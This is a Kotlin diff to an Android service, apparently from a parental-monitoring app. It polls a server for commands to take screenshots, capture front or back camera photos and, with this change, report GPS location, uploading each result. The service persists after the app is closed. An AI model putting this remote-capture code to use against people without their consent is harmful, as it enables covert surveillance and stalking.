@@ -69,7 +69,6 @@ class ScreenCaptureService : Service() {
         else
             @Suppress("DEPRECATION") intent?.getParcelableExtra("code")
 
-        // Screen capture setup (faqat ruxsat berilganda)
         if (code != null && code != Activity.RESULT_CANCELED && data != null) {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                 val b = getSystemService(WindowManager::class.java).currentWindowMetrics.bounds
@@ -79,10 +78,7 @@ class ScreenCaptureService : Service() {
             }
             dpi = resources.displayMetrics.densityDpi
 
-            projection?.stop()
-            display?.release()
-            reader?.close()
-
+            projection?.stop(); display?.release(); reader?.close()
             projection = (getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
                 .getMediaProjection(code, data)
             reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
@@ -93,7 +89,6 @@ class ScreenCaptureService : Service() {
             )
         }
 
-        // Heartbeat va poll tsikllarini faqat bir marta boshlash
         if (!running && ::deviceId.isInitialized) {
             running = true
             startHeartbeatLoop()
@@ -103,7 +98,6 @@ class ScreenCaptureService : Service() {
         return START_STICKY
     }
 
-    // ✅ Heartbeat — ilovadan chiqqanda ham ishlaydi
     private fun startHeartbeatLoop() {
         thread(name = "heartbeat") {
             try { api.register(deviceId, "Child device") } catch (_: Exception) {}
@@ -118,7 +112,6 @@ class ScreenCaptureService : Service() {
         }
     }
 
-    // ✅ Poll — ilovadan chiqqanda ham serverdan buyruq tekshiriladi
     private fun startPollLoop() {
         thread(name = "poll") {
             Thread.sleep(4_000)
@@ -140,17 +133,24 @@ class ScreenCaptureService : Service() {
                 when (type) {
                     "SCREENSHOT", "SCREEN_SHARE" -> {
                         if (projection == null || reader == null) {
-                            api.updateStatus(id, "FAILED")
-                            return@thread
+                            api.updateStatus(id, "FAILED"); return@thread
                         }
                         val b64 = capture()
-                        if (b64 != null) {
-                            val url = api.uploadImage(b64)
-                            api.updateStatus(id, "DONE", url)
+                        if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
+                        else api.updateStatus(id, "FAILED")
+                    }
+
+                    // ✅ Lokatsiya so'rovi
+                    "LOCATION" -> {
+                        val loc = LocationHelper(this).getLocation()
+                        if (loc != null) {
+                            val (lat, lng) = loc
+                            api.updateStatus(id, "DONE", "$lat,$lng")
                         } else {
                             api.updateStatus(id, "FAILED")
                         }
                     }
+
                     "CAMERA_FRONT" -> shootCamera(id, CameraCharacteristics.LENS_FACING_FRONT)
                     "CAMERA_BACK"  -> shootCamera(id, CameraCharacteristics.LENS_FACING_BACK)
                     else -> api.updateStatus(id, "FAILED")
@@ -163,12 +163,8 @@ class ScreenCaptureService : Service() {
 
     private fun shootCamera(id: String, facing: Int) {
         val b64 = CameraHelper(this).capturePhoto(facing)
-        if (b64 != null) {
-            val url = api.uploadImage(b64)
-            api.updateStatus(id, "DONE", url)
-        } else {
-            api.updateStatus(id, "FAILED")
-        }
+        if (b64 != null) api.updateStatus(id, "DONE", api.uploadImage(b64))
+        else api.updateStatus(id, "FAILED")
     }
 
     fun capture(): String? = try {
@@ -186,11 +182,8 @@ class ScreenCaptureService : Service() {
     } catch (_: Exception) { null }
 
     override fun onDestroy() {
-        running = false
-        instance = null
-        display?.release()
-        reader?.close()
-        projection?.stop()
+        running = false; instance = null
+        display?.release(); reader?.close(); projection?.stop()
         super.onDestroy()
     }
 
